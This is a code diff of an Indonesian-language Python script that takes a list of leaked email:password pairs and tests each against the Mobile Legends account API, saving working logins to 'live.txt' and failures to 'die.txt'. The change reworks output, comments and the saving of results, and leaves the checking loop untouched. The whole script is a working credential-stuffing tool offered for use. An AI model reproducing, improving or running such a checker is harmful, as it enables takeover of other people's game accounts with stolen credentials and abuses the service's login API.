@@ -7,13 +7,13 @@ import time
 from multiprocessing.pool import ThreadPool
 
 if sys.version_info.major != 3:
-    exit('\n[WARNING] Gunakan python versi 3')
+    exit('\033[91m[WARNING] Gunakan python versi 3\033[0m')
 
 class MOONTON:
     def __init__(self):
         self.userdata = []
-        self.live = []
-        self.die = []
+        self.live = [] # Menyimpan akun yang berhasil
+        self.die = []  # Menyimpan akun yang gagal
         self.api = 'https://accountmtapi.mobilelegends.com/'
         self.loading_symbols = ['\\', '|', '/', '-']
         self.loading_index = 0
@@ -31,16 +31,8 @@ class MOONTON:
         sys.stdout.flush()
 
     def main(self):
-        print('''               
-██████╗░░█████╗░███╗░░░███╗███████╗░██████╗██╗░░██╗██╗░░░██╗███╗░░░███╗███████═══╝
-██║░░██║██║░░██║██╔████╔██║█████╗░░╚█████╗░███████║██║░░░██║██╔████╔██║█████╗░░
-██║░░██║██║░░██║██║╚██╔╝██║██╔══╝░░░╚═══██╗██╔══██║██║░░░██║██║╚██╔╝██║██╔══╝░░
-██████╔╝╚█████╔╝██║░╚═╝░██║███████╗██████╔╝██║░░██║╚██████╔╝██║░╚═╝░██║███████╗
-╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚═════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚══════╝''')
-        print("\n\033[92m[+] Mohon tunggu, sedang memeriksa akun...\033[0m")
-        time.sleep(3)
-        os.system('cls' if os.name == 'nt' else 'clear')
-        empas = input('\033[92m[?] List empas (ex: list.txt): \033[0m')
+        print('[\033[92m!] Pemisah email:password atau email|password\033[0m\n')
+        empas = input('[?] List empas (ex: list.txt): ')
         if os.path.exists(empas):
             total_accounts = sum(1 for line in open(empas))
             for data in open(empas, 'r').readlines():
@@ -65,16 +57,14 @@ class MOONTON:
                         pass
             if len(self.userdata) == 0:
                 exit('\033[91m[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass\033[0m')
-            print('\033[92m[*] Total {0} Account\033[0m\n'.format(str(len(self.userdata))))
-            for _ in range(3):
-                for i, user in enumerate(self.userdata, 1):
-                    self.loading_animation()
-                    self.progress_bar(i, total_accounts)
-            print('\n\033[92m[+] Proses selesai.\033[0m')
-            ThreadPool(20).map(self.validate, self.userdata)
-            print('\n\033[92m[#] BERHASIL: {0} - saved: live.txt\033[0m'.format(str(len(self.live))))
-            print('\033[91m[#] GAGAL: {0} - saved: die.txt\033[0m'.format(str(len(self.die))))
-            exit(0)
+            print('[*] Total {0} Account\n'.format(str(len(self.userdata))))
+
+            # Menjalankan thread untuk memeriksa akun
+            self.validate_accounts()
+
+            # Menyimpan histori ke file
+            self.save_history()
+
         else:
             print('\033[91m[!] File tidak ditemukan "{0}"\033[0m'.format(empas))
 
@@ -101,16 +91,36 @@ class MOONTON:
             data = self.build_params(user)
             response = requests.post(self.api, data=data).json()
             if response['message'] == 'Error_Success':
-                print('\033[92m[+] BERHASIL\033[0m ' + user['userdata'])
+                print('[\033[92mBERHASIL\033[0m] '+user['userdata'])
                 self.live.append(user['userdata'])
-                open('live.txt', 'a').write(str(user['userdata']) + '\n')
             else:
-                print('\033[91m[+] GAGAL\033[0m ' + user['userdata'])
+                print('[\033[91mGAGAL\033[0m] '+user['userdata'])
                 self.die.append(user['userdata'])
-                open('die.txt', 'a').write(str(user['userdata']) + '\n')
         except:
             self.validate(user)
 
+    def validate_accounts(self):
+        print('[+] Memeriksa akun...\n')
+        for _ in range(3):
+            for i, user in enumerate(self.userdata, 1):
+                self.loading_animation()
+                self.progress_bar(i, len(self.userdata))
+                self.validate(user)
+        print('\n[+] Proses selesai.\n')
+
+    def save_history(self):
+        print('[+] Menyimpan histori...\n')
+        if len(self.live) > 0:
+            with open('live.txt', 'w') as f:
+                for data in self.live:
+                    f.write(data + '\n')
+            print('[+] BERHASIL: {0} - saved: live.txt'.format(str(len(self.live))))
+        if len(self.die) > 0:
+            with open('die.txt', 'w') as f:
+                for data in self.die:
+                    f.write(data + '\n')
+            print('[+] GAGAL: {0} - saved: die.txt'.format(str(len(self.die))))
+
 if __name__ == '__main__':
-    (MOONTON().main())
+    MOONTON().main()
         
